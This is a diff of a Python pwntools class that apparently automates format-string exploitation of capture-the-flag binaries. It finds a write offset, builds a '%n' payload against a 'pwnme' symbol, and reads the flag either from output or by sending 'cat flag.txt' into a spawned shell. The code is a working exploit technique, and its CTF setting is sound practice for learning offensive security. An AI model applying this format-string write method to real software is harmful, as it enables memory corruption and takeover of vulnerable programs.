@@ -13,7 +13,8 @@ class FMT:
         
 
         if not self.stack_leak():
-            return self.write_prim()
+            if self.analysis.vuln_has_cmp():
+                self.write_prim()
 
     def stack_leak(self):
         hex_vals = []
@@ -48,7 +49,7 @@ class FMT:
         offset = self.find_write_prim_offset()
         if offset:
             # Find the value
-            val = 209
+            val = self.analysis.get_vuln_args()
             pwnme = p64(self.e.sym["pwnme"])
             payload = f"%{val}d%{offset+1}$n".encode("utf-8")
             payload += b"A"*(8-(len(payload)%8))
@@ -56,9 +57,15 @@ class FMT:
 
             p = process(self.filename)
             p.sendline(payload)
-            p.recvuntil(b"<<<")
-            p.recvline()
-            print(p.recvline().decode("utf-8"))
+            
+            if self.analysis.has_catflagtxt():
+                p.recvuntil(b"<<<")
+                p.recvline()
+                print(p.recvline().decode("utf-8"))
+            elif self.analysis.has_binsh():
+                p.sendline(b"cat flag.txt")
+                p.recvuntil(b"flag")
+                print("flag" + p.recvline().decode('utf-8'))
 
     def find_write_prim_offset(self):
         offset = None
@@ -72,7 +79,7 @@ class FMT:
             p.recvuntil(b"<<<")
             if b"0xdeadbeefdeadbeef" in p.recvline():
                 offset = x
-
+        
         return offset
 
     def libc_leak(self):
